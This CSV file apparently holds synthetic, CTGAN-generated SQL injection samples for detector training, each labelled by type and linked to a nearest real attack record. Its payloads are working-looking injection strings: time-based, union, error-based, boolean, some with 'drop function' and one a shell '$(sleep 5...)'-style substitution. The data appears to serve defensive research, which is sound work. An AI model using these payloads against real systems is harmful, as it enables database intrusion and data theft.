id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001072,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R005698,5.248325911342148
CTGAN_001073,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R003864,3.753203319636259
CTGAN_001074,attack,other,select case when 7951  =  1147 then 1 else null end--,nearest_attack_euclidean,R002014,2.832082462151671
CTGAN_001075,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,4.255738673350513
CTGAN_001076,attack,time,1'  )   or sleep  (  5  ) ,nearest_attack_euclidean,R002985,1.9554259055462888
CTGAN_001077,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000156,9.108676248623153
CTGAN_001078,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.6289037969439994
CTGAN_001079,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R006408,3.093328528243164
CTGAN_001080,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R007867,3.040718005394135
CTGAN_001081,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000246,4.5379513783793355
CTGAN_001082,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.2771680034047046
CTGAN_001083,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",nearest_attack_euclidean,R007150,3.845246065748811
CTGAN_001084,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000163,5.273015497639253
CTGAN_001085,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,2.670866550960156
CTGAN_001086,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,4.136096168582813
CTGAN_001087,attack,union,"1""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R005861,7.342081190183658
CTGAN_001088,attack,other,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R001045,2.0017985077598177
CTGAN_001089,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R005356,3.445213888920885
CTGAN_001090,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R002606,3.4760495040111037
CTGAN_001091,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R007364,3.5877776745163126
CTGAN_001092,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,5.241856616401664
CTGAN_001093,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.0483270400176385
CTGAN_001094,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,5.042846211958283
CTGAN_001095,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R002795,4.815297550193382
CTGAN_001096,attack,boolean,"1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R006881,2.9398491368228132
CTGAN_001097,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R002895,3.4081291353856216
CTGAN_001098,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.516039380643572
CTGAN_001099,attack,boolean, or uid like '%,nearest_attack_euclidean,R000205,5.45960716223085
CTGAN_001100,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R006999,3.954415743718797
CTGAN_001101,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,3.925106081531959
CTGAN_001102,attack,error,"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R006375,4.145840533543705
CTGAN_001103,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003315,2.993657393653089
CTGAN_001104,attack,union,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",nearest_attack_euclidean,R001681,6.6994274116051615
CTGAN_001105,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,nearest_attack_euclidean,R006082,3.802678265434112
CTGAN_001106,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,3.4714928160735252
CTGAN_001107,attack,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",nearest_attack_euclidean,R005054,4.401689475726087
CTGAN_001108,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,2.1182499264784993
CTGAN_001109,attack,boolean,"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",nearest_attack_euclidean,R001723,2.2179597447901727
CTGAN_001110,attack,boolean,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,nearest_attack_euclidean,R008413,3.9872574574677273
CTGAN_001111,attack,other,1   )    )    as vcvn where 2106  =  2106,nearest_attack_euclidean,R006768,0.8400469993374313
CTGAN_001112,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.1280835280849235
CTGAN_001113,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R007870,3.3499935347056504
CTGAN_001114,attack,other,"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008652,3.8371351937031672
CTGAN_001115,attack,other,end  )  ||',nearest_attack_euclidean,R006985,4.190848797005561
CTGAN_001116,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R008562,4.928873877277565
CTGAN_001117,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,3.4500045295875226
CTGAN_001118,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R004177,3.16492270172542
CTGAN_001119,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R008434,3.5861829081050756
CTGAN_001120,attack,boolean,"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R002276,2.5411347409918545
CTGAN_001121,attack,union,"1%' union all select null,null,null,null--",nearest_attack_euclidean,R003342,5.29977406799668
CTGAN_001122,attack,error,"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R001129,5.493266068739509
CTGAN_001123,attack,error,"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",nearest_attack_euclidean,R000687,5.5602911972509
CTGAN_001124,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000282,17.66488898636394
CTGAN_001125,attack,boolean,1' in boolean mode  )   and   (  8610  =  2985  )  *2985#,nearest_attack_euclidean,R005566,3.1592283999076396
CTGAN_001126,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R004724,2.9945835563420062
CTGAN_001127,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000385,5.391035080217686
CTGAN_001128,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R007249,5.468032035140575
CTGAN_001129,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000982,3.431146034256679
CTGAN_001130,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R001110,1.9273195992422305
CTGAN_001131,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R007656,3.0010382634879837
CTGAN_001132,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R006817,3.156499419267489
CTGAN_001133,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R001852,5.0245299463886415
CTGAN_001134,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000101,4.452904128185518
CTGAN_001135,attack,error,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,nearest_attack_euclidean,R004363,4.1107217261884035
CTGAN_001136,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000330,5.837666262859913
CTGAN_001137,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,43.25289977967354
CTGAN_001138,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.303750096055978
CTGAN_001139,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R003512,3.834148750729193
CTGAN_001140,attack,boolean,1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R007933,4.849945728101094
CTGAN_001141,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,3.864848867527933
CTGAN_001142,attack,error,"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R001501,4.255456555955316
CTGAN_001143,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.685259897292193
CTGAN_001144,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R006370,2.485714919466504
CTGAN_001145,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,nearest_attack_euclidean,R005084,3.793115808827163
CTGAN_001146,attack,other,if  (  4907  =  9581  )   select 4907 else drop function apqw--,nearest_attack_euclidean,R008010,4.20963754614029
CTGAN_001147,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.168930678387322
CTGAN_001148,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R005810,4.287989440780583
CTGAN_001149,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,2.1438077222157426
CTGAN_001150,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,4.545514815873311
CTGAN_001151,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",nearest_attack_euclidean,R001682,4.857783236882729
CTGAN_001152,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,3.2014691651966256
CTGAN_001153,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,3.892476059512547
CTGAN_001154,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003001,1.560731183651997
CTGAN_001155,attack,boolean,"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R005391,3.3489732387340903
CTGAN_001156,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R005273,6.525921261552154
CTGAN_001157,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R006048,4.925400777457731
CTGAN_001158,attack,other,1'   )    )    as eymg where 7000  =  7000,nearest_attack_euclidean,R000829,1.4821263399702584
CTGAN_001159,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R003954,3.194337692790673
CTGAN_001160,attack,other, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,nearest_attack_euclidean,R004608,5.496666216982014
CTGAN_001161,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R002367,4.861934826876586
CTGAN_001162,attack,union,"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",nearest_attack_euclidean,R002222,4.155966345454722
CTGAN_001163,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R005837,1.9317218361934754
CTGAN_001164,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.998120615440103
CTGAN_001165,attack,other,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",nearest_attack_euclidean,R003287,1.975125477440591
CTGAN_001166,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'hgwt' like 'hgwt,nearest_attack_euclidean,R005052,4.5342699816088885
CTGAN_001167,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000070,4.204656348099475
CTGAN_001168,attack,other,"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R008559,9.63245840311718
CTGAN_001169,attack,boolean,1%' and 1736  =  4220,nearest_attack_euclidean,R002724,3.779473408023621
CTGAN_001170,attack,other,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004600,2.747525203858546
CTGAN_001171,attack,boolean,"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R005999,3.8369575290538314
CTGAN_001172,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,4.1619399035765605
CTGAN_001173,attack,other,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R006023,5.873492441868489
CTGAN_001174,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R005272,8.593084175921518
CTGAN_001175,attack,other,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R005735,4.195979859007154
CTGAN_001176,attack,boolean,"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R008336,4.6207568380644375
CTGAN_001177,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,4.006258307081477
CTGAN_001178,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R003089,4.034655511916257
CTGAN_001179,attack,error,"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",nearest_attack_euclidean,R005497,3.8644879948593545
CTGAN_001180,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R001103,5.6108701421718505
CTGAN_001181,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,4.836195250629881
CTGAN_001182,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,3.759128716141458
CTGAN_001183,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R006563,3.532395821645844
CTGAN_001184,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000253,3.6104201713302477
CTGAN_001185,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R004156,4.197684774925478
CTGAN_001186,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R006582,2.9576912324043483
CTGAN_001187,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,2.533906320134656
CTGAN_001188,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",nearest_attack_euclidean,R002636,4.595843949733542
CTGAN_001189,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R006369,9.098148796477638
CTGAN_001190,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000989,4.208671246705422
CTGAN_001191,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001214,3.5971555841161638
CTGAN_001192,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,4.553458788867718
CTGAN_001193,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,7.180560533486016
CTGAN_001194,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R005119,4.041093034101762
CTGAN_001195,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.7937215207050465
CTGAN_001196,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R002877,2.695160845215331
CTGAN_001197,attack,boolean,1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,nearest_attack_euclidean,R002796,1.431874711725622
CTGAN_001198,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R001212,3.0669710036481983
CTGAN_001199,attack,other, (  case when 2646  =  8520 then 2646 else null end  ) ,nearest_attack_euclidean,R001379,2.772393953039837
CTGAN_001200,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,3.0675352662053004
CTGAN_001201,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R001843,3.5718248196870426
CTGAN_001202,attack,error,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",nearest_attack_euclidean,R005676,5.872890298832014
CTGAN_001203,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R007704,6.377674226646275
CTGAN_001204,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000874,2.732966739113824
CTGAN_001205,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R003160,3.7462183133876272
CTGAN_001206,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,5.833588359127143
CTGAN_001207,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.8064904187684165
CTGAN_001208,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R006095,3.20337958595817
CTGAN_001209,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R008331,3.6603493344383127
CTGAN_001210,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R008318,3.5926570655053855
CTGAN_001211,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,0.961539355367472
CTGAN_001212,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004549,3.0608975398542815
CTGAN_001213,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R003879,3.7174146317254784
